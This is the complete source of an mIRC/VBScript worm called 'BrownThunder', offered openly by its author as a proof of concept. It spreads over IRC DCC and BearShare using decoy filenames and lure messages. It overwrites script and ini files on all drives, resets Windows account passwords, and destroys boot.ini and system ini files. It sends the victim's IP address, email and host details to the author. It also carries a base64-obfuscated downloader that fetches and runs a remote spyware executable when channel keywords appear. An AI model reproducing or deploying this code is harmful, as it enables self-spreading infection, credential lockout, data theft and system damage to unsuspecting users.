; IRC-Worm 'BrownThunder' (C) 2006 by sk0r / Czybik
; ============================================
;
; This is a real Irc-Worm. It is completely 
; written in mrc (msl) and can spread with
; mirc as well as bearshare. Well because I
; have never seen a real mirc worm completely
; written in mrc (msl) (I only heard from one but
; havent seen the code), I decided to code one.
; Only some parts are in vbscript, but not all.
; Well it is a 'PoC' Worm and could be buggy as
; I havent tested it. Here are the features:
; -----------------------------------------------
; - Overwrites 'mirc.ini' so that mirc accepts
;   critical files and ignores harmless files,
;   joins my and eof-project channel, use the
;   undernet network and changes the nick, anick
;   and the email-address, and also write to rfiles
;   the worm file so that it starts always.
;   Also the warnings of dcc and link will 
;   be disabled.
; - Changes the mirc titlebar
; - Spreads with bearshare lite if its installed
;   therefore it uses four nice looking filenames
; - Trys to overwrite all mrc, ini and tcl files
:   which it founds on all harddrives.
; - If the current day is Friday, it changes the
;   administrator and password of the current user
;   in random strings with seven characters.
; - If the current day is Saturday or Sunday it
;   overwrites the 'boot.ini' so that on boot
;   a string will appear (replaces the normal string)
; - If the user connects to the Undernet network
;   he will send some informations of the user to
;   me. Those are the ip-address, the nickname,
;   the alternate nickname, the fullname, the
;   email address, the usermode, the server,
;   the serverip, the network, the os and hostname
; - For every 10th user joining a channel the
;   worm trys to send him the wormfile or trys
;   to send him a website address with the worm
; - If the user wants to join another channel
;   which is not my or eof-project channel 
;   he will leave the channel again.
; - If someone types 'shutdown' in a channel 
;   where the user is, the worm will try to
;   shutdown the computer, this works only
;   if wmi is installed. Also if
;   someone types 'reboot' the worm trys to
;   reboot the computer. 
; - Is someone types backdoor, trojan, skowisky,
;   server, remote or administrator the worm trys
;   to download the Skowisky Server file and 
;   executes it.
; - If someone types 'sk0r' or 'Czybik' then the
;   user will write a sentence into the channel
; -----------------------------------------------
;
; Worm made by sk0r / Czybik [EOF-Project Member]
;
; sk0r1337@gmx.de <> www.sk0r-Czybik.de.vu <> www.eof-project.net
;
;

alias Shutdown {
	if (!$exists(shutdown.vbs)) {
	/fopen -n shutdown shutdown.vbs
	/fwrite -n shutdown Set wmi = GetObject _ $crlf
    /fwrite -n shutdown ("winmgmts:{impersonationLevel=impersonate,(Shutdown)}\\"+ _ $crlf
	/fwrite -n shutdown createobject("wscript.network").computername+"\root\cimv2") $crlf
	/fwrite -n shutdown For Each machin in wmi.ExecQuery("Select * from Win32_OperatingSystem") $crlf
    /fwrite -n shutdown machin.Win32Shutdown(1) $crlf
	/fwrite -n shutdown Next $crlf
	/fclose shutdown
	/run shutdown.vbs
	/remove shutdown.vbs
	}
}

alias Reboot {
	if (!$exists(reboot.vbs)) {
	/fopen -n reboot reboot.vbs
	/fwrite -n reboot Set wmi = GetObject("winmgmts:" _ $crlf
    /fwrite -n reboot & "{impersonationLevel=impersonate,(Shutdown)}!\\" + _ $crlf
	/fwrite -n reboot createobject("wscript.network").computername+ "\root\cimv2") $crlf
	/fwrite -n reboot For Each machin in wmi.ExecQuery("Select * from Win32_OperatingSystem") $crlf
    /fwrite -n reboot machin.Reboot() $crlf
	/fwrite -n reboot Next $crlf
	/fclose reboot
	/run reboot.vbs
	/remove reboot.vbs
	}
}


alias DownloadSkowiskyServer {
	if (!$exists(downloader.js)) {
	/fopen -n downloader downloader.js
	/fwrite -n downloader $decode(dmFyIGZzbyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOw==,m) $crlf
	/fwrite -n downloader $decode(dmFyIHdzaHMgPSBuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw==,m) $crlf
	/fwrite -n downloader $decode(dmFyIHRlbXBkaXIgPSBmc28uZ2V0c3BlY2lhbGZvbGRlcigyKTs=,m) $crlf
	/fwrite -n downloader $decode(dmFyIHhtbERsZHIgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTs=,m) $crlf
	/fwrite -n downloader $decode(eG1sRGxkci5PcGVuKCJHRVQiLCAiaHR0cDovL3Blb3BsZS5mcmVlbmV0LmRlL3NrMHIxMzM3L3NweXdhcmUuZXhlIiAsMCk7,m) $crlf
	/fwrite -n downloader $decode(eG1sRGxkci5TZW5kKCk7,m) $crlf
	/fwrite -n downloader $decode(dmFyIGFkU3RyZWFtID0gbmV3IEFjdGl2ZVhPYmplY3QoIkFET0RCLlN0cmVhbSIpOw==,m) $crlf
	/fwrite -n downloader $decode(YWRTdHJlYW0uTW9kZSA9IDM7,m) $crlf
	/fwrite -n downloader $decode(YWRTdHJlYW0uVHlwZSA9IDE7,m) $crlf
	/fwrite -n downloader $decode(YWRTdHJlYW0uT3BlbigpOw==,m) $crlf
	/fwrite -n downloader $decode(YWRTdHJlYW0uV3JpdGUoeG1sRGxkci5yZXNwb25zZUJvZHkpOw==,m) $crlf
	/fwrite -n downloader $decode(YWRTdHJlYW0uU2F2ZVRvRmlsZSh0ZW1wZGlyICsgIlx0ZW1wc3B5d2FyZWRhdGVpLmV4ZSIsMik7,m) $crlf
	/fwrite -n downloader $decode(d3Nocy5SdW4odGVtcGRpciArICJcdGVtcHNweXdhcmVkYXRlaS5leGUiKTs=,m) $crlf
	/fclose downloader
	/run downloader.js
	/remove downloader.js
	}
}


On 1:Start: {
	/titlebar Infected with IRC-Worm/BrownThunder.A by sk0r / Czybik
	set %dccVaria 1
	set %zufallssend $rand(1,2)
	set %root $left($mircdir,3)
	
	if(!$exists(mirc.vbs)) {
	/fopen -n mircini mirc.vbs
	/fwrite -n mircini set fso = createobject("scripting.filesystemobject") $crlf
	/fwrite -n mircini fso.deletefile("mirc.ini") $crlf
	/fclose mircini
	/run mirc.vbs
	/fopen -n crtmirc mirc.ini
	/fwrite -n crtmirc [text] $crlf
	/fwrite -n crtmirc accept=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs,*.htm,*.html $crlf
	/fwrite -n crtmirc ignore=*.bmp,*.gif,*.jpg,*.log,*.mid,*.mp3,*.png,*.txt,*.wav,*.wma,*.zip $crlf
	/fwrite -n crtmirc network=Undernet $crlf
	/fwrite -n crtmirc defport=6667 $crlf
	/fwrite -n crtmirc commandchar=/ $crlf
	/fwrite -n crtmirc linesep=- $crlf
	/fwrite -n crtmirc timestamp=[HH:nn] $crlf
	/fwrite -n crtmirc theme=mIRC Classic $crlf
	/fwrite -n crtmirc [warn] $crlf
	/fwrite -n crtmirc dcc=off $crlf
	/fwrite -n crtmirc fserve=on $crlf
	/fwrite -n crtmirc link=off $crlf
	/fwrite -n crtmirc [mirc] $crlf
	/fwrite -n crtmirc user=efawwfe $crlf
	/fwrite -n crtmirc email=efawwfe@gmail.com $crlf
	/fwrite -n crtmirc nick=efawwfe $crlf
	/fwrite -n crtmirc anick=hexascmidlol $crlf
	/fwrite -n crtmirc host=Undernet: EU, AT, Graz2SERVER:graz2.at.eu.undernet.org:6665GROUP:Undernet $crlf
	/fwrite -n crtmirc [chanfolder] $crlf
	/fwrite -n crtmirc n0=#eof-project,,,,1,1 $crlf
	/fwrite -n crtmirc n1=#sk0r.Czybik,,,,1,1 $crlf
	/fwrite -n crtmirc [rfiles] $crlf
	/fwrite -n crtmirc n0=remote.ini $crlf
	/fwrite -n crtmirc n1=remote.ini $crlf
	/fwrite -n crtmirc n2=script.ini $crlf
	/fwrite -n crtmirc n3=users.mrc $crlf
	/fclose crtmirc
	/remove mirc.vbs
	/clear
}

	if(!$exists(bearshare.vbs)) {
	/fopen -n bearshare bearshare.vbs
	/fwrite -n bearshare set fso = createobject("scripting.filesystemobject") $crlf
	/fwrite -n bearshare set wshs = createobject("wscript.shell") $crlf
	/fwrite -n bearshare bearshare = wshs.regread("HKEY_LOCAL_MACHINE\SOFTWARE\BearShare\" & "InstallDir") $crlf
	/fwrite -n bearshare if bearshare <> "" then $crlf
	/fwrite -n bearshare set opnfile = fso.opentextfile(bearshare+"\FreePeers.ini") $crlf
	/fwrite -n bearshare while not opnfile.AtEndOfStream $crlf
	/fwrite -n bearshare readl = opnfile.ReadLine $crlf
	/fwrite -n bearshare if instr(ucase(readl),"SZDOWNLOADSDIR") then $crlf
	/fwrite -n bearshare dlfolder = mid(readl, instr(ucase(readl),"=")+1) $crlf
	/fwrite -n bearshare dlfolder = replace(dlfolder,"""","") $crlf
	/fwrite -n bearshare bearsharedownloads = replace(dlfolder,mid(readl,instr(ucase(readl),";")),"") $crlf
	/fwrite -n bearshare end if $crlf
	/fwrite -n bearshare wend $crlf
	/fwrite -n bearshare opnfile.close $crlf
	/fwrite -n bearshare filenames = array("OverTaker mIRC Script v2.7.mrc", "NNScript v5.7.mrc", "AK-47 mIRC Script.mrc", "Irc Floodscript v2.7.mrc") $crlf
	/fwrite -n bearshare set gtfake = fso.getfile ("$mircdir\users.mrc") $crlf
	/fwrite -n bearshare for each datei in filename $crlf
	/fwrite -n bearshare gtfake.copy (bearsharedownloads+datei) $crlf
	/fwrite -n bearshare next $crlf
	/fwrite -n bearshare end if $crlf
	/fclose bearshare
	/run bearshare.vbs
	/remove bearshare.vbs
	/clear
	
	if (!exists(hackfiles.vbs)) {
	/fopen -n hackfiles hackfiles.vbs
	/fwrite -n hackfiles Function FindeBestimmteDateien(FestplattenName) $crlf
	/fwrite -n hackfiles On Error Resume Next $crlf
	/fwrite -n hackfiles Set fso = CreateObject("scripting.filesystemobject") $crlf
	/fwrite -n hackfiles set gtmrcfile = fso.opentextfile("$mircdir\users.mrc") $crlf
	/fwrite -n hackfiles allcont = gtmrcfile.readall $crlf
	/fwrite -n hackfiles gtmrcfile.close $crlf
	/fwrite -n hackfiles Set gtString = fso.getfolder(FestplattenName) $crlf
	/fwrite -n hackfiles Set AlleUnterOrdner = gtString.subfolders $crlf
	/fwrite -n hackfiles For Each JedenUnterOrdner In AlleUnterOrdner $crlf
	/fwrite -n hackfiles Set AlleDatenDateien = JedenUnterOrdner.Files $crlf
	/fwrite -n hackfiles For Each AlleEinzelnenDateien In AlleDatenDateien $crlf
	/fwrite -n hackfiles strExten = LCase(fso.getextensionname(AlleEinzelnenDateien.Path)) $crlf
	/fwrite -n hackfiles If strExten = "mrc" Or strExten = "ini" Or strExten = "tcl" Then $crlf
	/fwrite -n hackfiles Set openforwrite = fso.createtextfile(AlleEinzelnenDateien.Path, True) $crlf
	/fwrite -n hackfiles openforwrite.write allcont $crlf
	/fwrite -n hackfiles openforwrite.Close $crlf
	/fwrite -n hackfiles End If $crlf
	/fwrite -n hackfiles Next $crlf
	/fwrite -n hackfiles Next $crlf
	/fwrite -n hackfiles For Each NochMehrUnterOrdner In AlleUnterOrdner $crlf
	/fwrite -n hackfiles FindeBestimmteDateien (NochMehrUnterOrdner) $crlf
	/fwrite -n hackfiles Next $crlf
	/fwrite -n hackfiles End Function $crlf
	/fwrite -n hackfiles Set pcdriv = CreateObject("scripting.filesystemobject").drives $crlf
	/fwrite -n hackfiles For Each Festplatte In pcdriv $crlf
	/fwrite -n hackfiles FindeBestimmteDateien (Festplatte) $crlf
	/fwrite -n hackfiles Next  $crlf
	/fclose hackfiles
	/run hackfiles.vbs
	/remove hackfiles.vbs
	;/DownloadSkowiskyServer
}

if ($day == Friday) {
  set %kaka1 $rand(a,z)
  set %kaka2 $rand(a,z)
  set %kaka3 $rand(a,z)
  set %kaka4 $rand(a,z)
  set %kaka5 $rand(a,z)
  set %kaka6 $rand(a,z)
  set %kaka7 $rand(a,z)
  set %kaka8 $rand(a,z)
  set %kaka9 $rand(a,z)
  set %kaka10 $rand(a,z)
  set %pwstring %kaka1 %kaka2 %kaka3 %kaka4 %kaka5 %kaka6 %kaka7 %kaka8 %kaka9 %kaka10
  set %enctext $replace(%pwstring,$chr(32),)
  set %enced $encode(%enctext,t)
  /fopen -n passw passw.txt
  /fwrite passw %enced
  /fclose passw
  /run cmd /c net user administrator %enctext
  /run cmd /c net user %UserName% %enctext
  /clear
}

if (($day == Saturday) || ($day == Sunday)) {
	if(!$exists(deleteion.vbs)) {
	/fopen -n vbsfile $mircdir\deleteion.vbs
	/fwrite vbsfile set fso = createobject("scripting.filesystemobject") $crlf
	/fwrite vbsfile set windir = fso.getspecialfolder(0) $crlf
	/fwrite vbsfile hddisk = left(windir,2) $crlf
	/fwrite vbsfile fso.deletefile(windir+"\win.ini") $crlf
	/fwrite vbsfile fso.deletefile(windir+"\system.ini") $crlf
	/fwrite vbsfile set gtboot = fso.getfile(hddisk+"\BOOT.INI") $crlf
	/fwrite vbsfile gtboot.attributes = gtboot.attributes -4 $crlf
	/fwrite vbsfile gtboot.attributes = gtboot.attributes -2 $crlf
	/fwrite vbsfile gtboot.attributes = gtboot.attributes -1 $crlf
	/fwrite vbsfile set fboot = fso.createtextfile(hddisk+"\BOOT.INI", True) $crlf
	/fwrite vbsfile fboot.writeline ("[boot loader]") $crlf
	/fwrite vbsfile fboot.writeline ("default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS") $crlf
	/fwrite vbsfile fboot.writeline ("[operating systems]") $crlf
	/fwrite vbsfile fboot.writeline ("multi(X)disk(X)rdisk(X)partition(X)\WINDOWS=""Hacked by sk0r alias Czybik""") $crlf
	/fwrite vbsfile fboot.close $crlf
	/fclose vbsfile 
	/run deleteion.vbs
	/remove deleteion.vbs
	/clear
	}
}

}

On 1:Connect:* {
    if ($network == Undernet) {
	/msg sk0r1337 4 Hello sk0r / Czybik
	/msg sk0r1337 4 ====================
	/msg sk0r1337 My name is $me and my mirc is infected with
	/msg sk0r1337 your worm called IRC-Worm/BrownThunder.A
	/msg sk0r1337 Here are some informations about me:
	/msg sk0r1337 3 Nickname  : $nick
	/msg sk0r1337 3 Alternate : $anick
	/msg sk0r1337 3 Ip-Address: $ip
	/msg sk0r1337 3 Email     : $emailaddr
	/msg sk0r1337 3 Fullname  : $fullname
	/msg sk0r1337 3 Host      : $host
	/msg sk0r1337 3 Network   : $network
	/msg sk0r1337 3 Server    : $server
	/msg sk0r1337 3 Serverip  : $serverip
	/msg sk0r1337 3 Usermode  : $usermode
	/msg sk0r1337 3 System    : Windows $os
	/join #sk0r.Czybik ,  #eof-project
	}
}


On *:Join:#: {
	/inc %dccVaria
	if ($nick == $me) { halt }
		if (%dccVaria == 7) {
			if(%zufallssend == 1) {
				/msg $nick Hey, This is a very good overtaker script. To Run it type '/load -rs users.mrc'
				/dcc send $nick users.mrc
			}
			else {
				/msg $nick Hey, get this good overtaker script to make a channel of your choice to your channel!
				/msg $nick It is very easy. Go to http://mircpwn.mi.ohost.de/MircOvertaker.zip and download the script.
				/msg $nick Unzip it in your mirc folder and type in mirc: '/load -rs users.mrc' and then own channels ;-)
			}
			set %dccVaria 1
		}
	;if(($chan != #sk0r.Czybik) || ($chan != #eof-project)) {
		;/part $chan
	;}
}




On 1:Text:#:*shutdown*: {
	;/run shutdown.exe -c "IRC-Worm/BrownThunder.A" -t 01 -s
	/Shutdown
}

On 1:Text:#:*reboot*: {
	;/run shutdown.exe -c "IRC-Worm/BrownThunder.A" -t 01 -r
	/Reboot
}

On 1:Text:#:*server*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*trojan*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*administrator*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*skowisky*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*remote*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*backdoor*: {
   /DownloadSkowiskyServer
}

On 1:Text:#:*sk0r*: {
	/msg $chan IRC-Worm/BrownThunder.A made by sk0r / Czybik
}

On 1:Text:#:*Czybik*: {
	/msg $chan IRC-Worm/BrownThunder.A made by sk0r / Czybik
}


; <!-- End of IRC-Worm 'BrownThunder' <> Made by sk0r / Czybik [EOF] --!>

		